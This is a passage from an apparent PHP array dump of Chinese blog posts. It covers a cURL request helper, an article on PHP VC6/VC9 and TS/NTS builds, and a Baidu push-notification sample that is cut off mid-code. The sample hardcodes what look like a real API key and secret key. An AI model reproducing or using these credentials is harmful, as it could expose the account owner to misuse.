&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;string&nbsp;$url&nbsp;请求地址
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;string&nbsp;$method&nbsp;请求方式&nbsp;GET/POST
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;string&nbsp;$refererUrl&nbsp;请求来源地址
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;array&nbsp;$data&nbsp;发送数据
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;string&nbsp;$contentType
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;string&nbsp;$timeout
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@param&nbsp;string&nbsp;$proxy
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;@return&nbsp;boolean
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;send_request($url,&nbsp;$data,&nbsp;$refererUrl&nbsp;=&nbsp;&#39;&#39;,&nbsp;$method&nbsp;=&nbsp;&#39;GET&#39;,&nbsp;$contentType&nbsp;=&nbsp;&#39;application/json&#39;,&nbsp;$timeout&nbsp;=&nbsp;30,&nbsp;$proxy&nbsp;=&nbsp;false)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ch&nbsp;=&nbsp;null;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(&#39;POST&#39;&nbsp;===&nbsp;strtoupper($method))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ch&nbsp;=&nbsp;curl_init($url);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POST,&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_HEADER,0&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_FRESH_CONNECT,&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_FORBID_REUSE,&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_TIMEOUT,&nbsp;$timeout);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($refererUrl)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_REFERER,&nbsp;$refererUrl);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($contentType)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_HTTPHEADER,&nbsp;array(&#39;Content-Type:&#39;.$contentType));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(is_string($data)){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POSTFIELDS,&nbsp;$data);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_POSTFIELDS,&nbsp;http_build_query($data));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;if(&#39;GET&#39;&nbsp;===&nbsp;strtoupper($method))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(is_string($data))&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$real_url&nbsp;=&nbsp;$url.&nbsp;(strpos($url,&nbsp;&#39;?&#39;)&nbsp;===&nbsp;false&nbsp;?&nbsp;&#39;?&#39;&nbsp;:&nbsp;&#39;&#39;).&nbsp;$data;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$real_url&nbsp;=&nbsp;$url.&nbsp;(strpos($url,&nbsp;&#39;?&#39;)&nbsp;===&nbsp;false&nbsp;?&nbsp;&#39;?&#39;&nbsp;:&nbsp;&#39;&#39;).&nbsp;http_build_query($data);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ch&nbsp;=&nbsp;curl_init($real_url);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_HEADER,&nbsp;0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_HTTPHEADER,&nbsp;array(&#39;Content-Type:&#39;.$contentType));
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_RETURNTRANSFER,&nbsp;1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_TIMEOUT,&nbsp;$timeout);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;($refererUrl)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_REFERER,&nbsp;$refererUrl);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$args&nbsp;=&nbsp;func_get_args();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($proxy)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_setopt($ch,&nbsp;CURLOPT_PROXY,&nbsp;$proxy);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$ret&nbsp;=&nbsp;curl_exec($ch);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$info&nbsp;=&nbsp;curl_getinfo($ch);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$contents&nbsp;=&nbsp;array(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;httpInfo&#39;&nbsp;=&gt;&nbsp;array(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;send&#39;&nbsp;=&gt;&nbsp;$data,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;url&#39;&nbsp;=&gt;&nbsp;$url,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;ret&#39;&nbsp;=&gt;&nbsp;$ret,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&#39;http&#39;&nbsp;=&gt;&nbsp;$info,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl_close($ch);

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;$ret;
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p>调用 WCF接口 的一个例子：$json = restRequest($r_url,&#39;POST&#39;, json_encode($data));</p><p>&nbsp;</p><p>文章转自：http://blog.snsgou.com/post-161.html</p><p><br/></p>',
            'keyword' => 'php,http,请求',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 10:51:45',
          ),
          77 => 
          array (
            'id' => '8',
            'uid' => '1',
            'title' => '（转）PHP版本VC6与VC9、Thread Safe与None-Thread Safe等的区别',
            'content' => '<p>转载：http://www.cnblogs.com/whoknows/articles/2425841.html</p><p><br/></p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">最近发现很多PHP程序员对PHP版本知识了解不是很清楚，自己也看了不少类似的文章，还是感觉不够明确和全面，网上的结论又都是模棱两可，在此，给出最完整甚至武断的解释。</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">&nbsp;&nbsp;&nbsp; 本文讲解：VC6与VC9，Thread Safety与None-Thread Safe，Apache module与fastcgi的区别与选择。</p><h2 style=\\"margin-top: 10px; margin-bottom: 3px; font-size: 18px; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\"><a name=\\"t0\\"></a>PHP的大版本主要分三支：PHP4/PHP5/PHP6</h2><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">　　其中，PHP4由于太古老、对OO支持不力已基本被淘汰，请无视PHP4。</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">　　PHP6由于基本没有生产线上的应用，还基本只是一款概念产品，很多功能已在PHP5.3.3上实现，所以也不详述，请无视PHP6。</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">　　PHP5的版本主要分四支：PHP5.2之前的版本、PHP5.2.X、PHP5.3和日前发布的PHP5.4。</p><h2 style=\\"margin-top: 10px; margin-bottom: 3px; font-size: 18px; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\"><a name=\\"t1\\"></a>那我们应该如何选择适用自己项目的版本呢？</h2><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">&nbsp;&nbsp;&nbsp; PHP5.2之前的版本不值得考虑，因为某些功能缺陷或者BUG，PHP5.2之前的版本。PHP5.4还处于Beta试用的版本号，非稳定版本，请无视PHP5.4。</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">　　主流PHP程序对PHP5.2.X的兼容性最好，而每次版本号的升级带来的都是安全性和稳定性的改善，所以宜挑选最新的版本。目前PHP5.2系列最新的是PHP5.2.17。</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">　　而如果产品是自己开发自己使用，PHP5.3在某些方面更具优势，在稳定性上更胜一筹，增加了很多PHP5.2所不具有的功能，比如内置php-
fpm、更完善的垃圾回收算法、命名空间的引入、sqlite3的支持等等，是部署项目值得考虑的版本，强烈推荐PHP5.3.3。</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">　　除了版本号的不同，同一版本号的PHP版本也有区别，并且在选择PHP扩展的时候需要注意。</p><ul style=\\"margin-left: 45px; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 19px;\\"><li><p>install版：可执行的MSI格式安装包。</p></li><li><p>ZIP版：解压即可用。和install版无区别。建议选择ZIP版。</p></li><li><p>DEBUG版:请无视。</p></li></ul><h2 style=\\"margin-top: 10px; margin-bottom: 3px; font-size: 18px; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\"><a name=\\"t2\\"></a>VC6与VC9</h2><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">　　　对于VC6还是VC9版本的选择，PHP官方网站有详细的描述，原文如下：</p><pre name=\\"code\\" class=\\"sh_html sh_sourceCode\\">我该选择哪个版本？

如果你在apache1或者apache2下使用PHP，你应该选择VC6的版本
如果你在IIS下使用PHP应该选择VC9的版本
VC6的版本使用visual&nbsp;studio6编译
VC9使用Visual&nbsp;Studio&nbsp;2008编译，并且改进了性能和稳定性。VC9版本的PHP需要你安装Microsoft&nbsp;2008&nbsp;C++&nbsp;Runtime
不要在apache下使用VC9的版本</pre><h2 style=\\"margin-top: 10px; margin-bottom: 3px; font-size: 18px; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\"><a name=\\"t3\\"></a> TS和NTS</h2><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">TS指Thread Safety，即线程安全，一般在IIS以ISAPI方式加载的时候选择这个版本。</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">NTS即None-Thread Safe，一般以fast cgi方式运行的时候选择这个版本，具有更好的性能。</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">　
　从2000年10月20日发布的第一个Windows版的PHP3.0.17开始的都是线程安全的版本，这是由于与Linux/Unix系统是采用多 
进程的工作方式不同的是Windows系统是采用多线程的工作方式。如果在IIS下以CGI方式运行PHP会非常慢，这是由于CGI模式是建立在多进程的
 基础之上的，而非多线程。一般我们会把PHP配置成以ISAPI的方式来运行，ISAPI是多线程的方式，这样就快多了。但存在一个问题，很多常用的 
PHP扩展是以Linux/Unix的多进程思想来开发的，这些扩展在ISAPI的方式运行时就会出错搞垮IIS。因此在IIS下CGI模式才是 
PHP运行的最安全方式，但CGI模式对于每个HTTP请求都需要重新加载和卸载整个PHP环境，其消耗是巨大的。</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">　
　为了兼顾IIS下PHP的效率和安全，微软给出了FastCGI的解决方案。FastCGI可以让PHP的进程重复利用而不是每一个新的请求就重开一 
个进程。同时FastCGI也可以允许几个进程同时执行。这样既解决了CGI进程模式消耗太大的问题，又利用上了CGI进程模式不存在线程安全问题的优 
势。</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">　　因此，如果是使用ISAPI的方式来运行PHP就必须用Thread Safe(线程安全)的版本；而用FastCGI模式运行PHP的话就没有必要用线程安全检查了，用None Thread Safe(NTS，非线程安全)的版本能够更好的提高效率。</p><h2 style=\\"margin-top: 10px; margin-bottom: 3px; font-size: 18px; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\"><a name=\\"t4\\"></a> 如何查看当前运行的PHP的版本？一个很简单的办法就是phpinfo();</h2><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">Thread Safety disabled是NTS，enabled是TS</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">Configure Command看到VC98字样的是VC6，Compiler标明 MSVC9 (Visual C++ 2008) 的是VC9</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">在WIN7下：IIS7+NTS+FastCGI+vc9 是最佳搭档或者apache+fastcgi+nts+vc6。</p><p style=\\"font-size: 13px; line-height: 19px; margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif;\\">在WINXP下：Apache+TS+Apache module +vc6最合适的搭档。</p><p>-----------------------------------------------------------------------------------------------------------------------------------------------------------------</p><p style=\\"margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 20.78333282470703px;\\"><strong>IIS</strong></p><p style=\\"margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 20.78333282470703px;\\">如果想使用IIS配置PHP的话，那么需要选择Non-Thread Safe(NTS)版本的PHP</p><p style=\\"margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 20.78333282470703px;\\"><br/></p><p style=\\"margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 20.78333282470703px;\\"><strong>Apache</strong></p><p style=\\"margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 20.78333282470703px;\\">如果你是用的Apache的版本来自Apache Lounge（website：<a style=\\"color: #075db3;\\" href=\\"http://apachelounge.com/%EF%BC%89%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8PHP%20VC11%20x86%E6%88%96%E8%80%85x64\\" target=\\"_blank\\">http://apachelounge.com/</a>），可以使用PHP VC11 x86或者x64版本。</p><p style=\\"margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 20.78333282470703px;\\">如果你使用的是从apache.org下载的Apache1或者Apache2来搭建PHP环境的话，只能使用VC6版本，无法使用VC9+以上版本。</p><p style=\\"margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 20.78333282470703px;\\">&nbsp;</p><p style=\\"margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 20.78333282470703px;\\"><strong>VC9 和VC11</strong></p><p style=\\"margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 20.78333282470703px;\\">VC9和VC11是PHP的最新版本（这两个版本分别通过Visual Studio 2008和Visual Studio 2012编译），其中包含了对于性能和稳定性的改进。</p><p style=\\"margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 20.78333282470703px;\\">VC9版本要求用户安装Microsoft Visual C++ 2008 SP1 Redistributable Package（<a style=\\"color: #075db3;\\" href=\\"http://www.microsoft.com/en-us/download/details.aspx?id=5582\\" target=\\"_blank\\">x86</a>&nbsp;|&nbsp;<a style=\\"color: #075db3;\\" href=\\"http://www.microsoft.com/en-us/download/details.aspx?id=15336\\" target=\\"_blank\\">x64</a>）</p><p style=\\"margin: 10px auto!important; font-family: Verdana,Geneva,Arial,Helvetica,sans-serif; font-size: 13px; line-height: 20.78333282470703px;\\">VC11版本要求用户安装Visual C++ Redistributable for Visual Studio 2012（<a style=\\"color: #075db3;\\" href=\\"http://www.microsoft.com/en-us/download/details.aspx?id=30679\\" target=\\"_blank\\">x86 | x64</a>）</p><p><br/></p>',
            'keyword' => 'PHP版本,VC6,VC9,Thread Safe,None-Thread Safe',
            'sortid' => '6',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-18 10:45:14',
          ),
          78 => 
          array (
            'id' => '7',
            'uid' => '1',
            'title' => '使用PHP调用百度云推送',
            'content' => '<p>引入类库：</p><p>目录结构</p><p><img src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101628072851824.png\\" alt=\\"\\" data-mce-src=\\"http://images0.cnblogs.com/blog2015/682168/201506/101628072851824.png\\"/></p><p>push_date.php 是自己建立的，目的的做循环处理</p><p>代码如下：</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
require_once&nbsp;&quot;sample.php&quot;;/**
&nbsp;*&nbsp;调用消息推送的接口
&nbsp;*&nbsp;@param&nbsp;unknown&nbsp;$user_id
&nbsp;*&nbsp;@param&nbsp;unknown&nbsp;$type
&nbsp;*&nbsp;@param&nbsp;string&nbsp;$title
&nbsp;*&nbsp;@param&nbsp;string&nbsp;$mess
&nbsp;*&nbsp;@param&nbsp;string&nbsp;$push_type&nbsp;
&nbsp;*/
&nbsp;function&nbsp;push_date($user_id,$type,$title,$mess,$push_type)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//$user_id&nbsp;和&nbsp;$type&nbsp;有可能是数组
&nbsp;&nbsp;&nbsp;&nbsp;//foreach&nbsp;($user_id&nbsp;as&nbsp;$user_id)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if($type&nbsp;==&nbsp;&#39;ios&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test_pushMessage_ios($user_id,$mess,$push_type);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;if($type&nbsp;==&nbsp;&#39;android&#39;)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test_pushMessage_android($user_id,$title,$mess,$push_type);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test_pushMessage_ios($user_id,$mess,$push_type);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test_pushMessage_android($user_id,$title,$mess,$push_type);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//调用
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$user_id&nbsp;=&nbsp;&quot;799497108422983611&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$type&nbsp;=&nbsp;&quot;android&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$push_type&nbsp;=&nbsp;&quot;1&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$title&nbsp;=&nbsp;&quot;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$mess&nbsp;=&nbsp;&quot;&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push_date($user_id,$type,$title,$mess,$push_type);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//test_pushMessage_android($user_id);</pre><br/><p>sample.php 代码如下（在原始文件上改动）：</p><pre class=\\"brush:php;toolbar:false\\">&lt;?php
require_once&nbsp;&quot;./Channel.class.php&quot;;
//请开发者设置自己的apiKey与secretKey
$apiKey&nbsp;=&nbsp;&quot;5CkwQG0FXxUGsIfhbGdgbCqz&quot;;
$secretKey&nbsp;=&nbsp;&quot;HMsPjiHce53GM5LwkHCznYcA1CVLspGB&quot;;
//test_queryBindList(&#39;4653791&#39;);
//test_pushMessage_android(&#39;799497108422983611&#39;);
function&nbsp;error_output&nbsp;(&nbsp;$str&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;\\\\033[1;40;31m&quot;&nbsp;.&nbsp;$str&nbsp;.&quot;\\\\033[0m&quot;&nbsp;.&nbsp;&quot;\\\\n&quot;;
}
function&nbsp;right_output&nbsp;(&nbsp;$str&nbsp;)&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;\\\\033[1;40;32m&quot;&nbsp;.&nbsp;$str&nbsp;.&quot;\\\\033[0m&quot;&nbsp;.&nbsp;&quot;\\\\n&quot;;
}
function&nbsp;test_queryBindList&nbsp;(&nbsp;$userId&nbsp;)&nbsp;{&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$apiKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;global&nbsp;$secretKey;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$channel&nbsp;=&nbsp;new&nbsp;Channel&nbsp;($apiKey,&nbsp;$secretKey);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;$optional&nbsp;[&nbsp;Channel::CHANNEL_ID&nbsp;]&nbsp;=&nbsp;&quot;3915728604212165383&quot;;&nbsp;
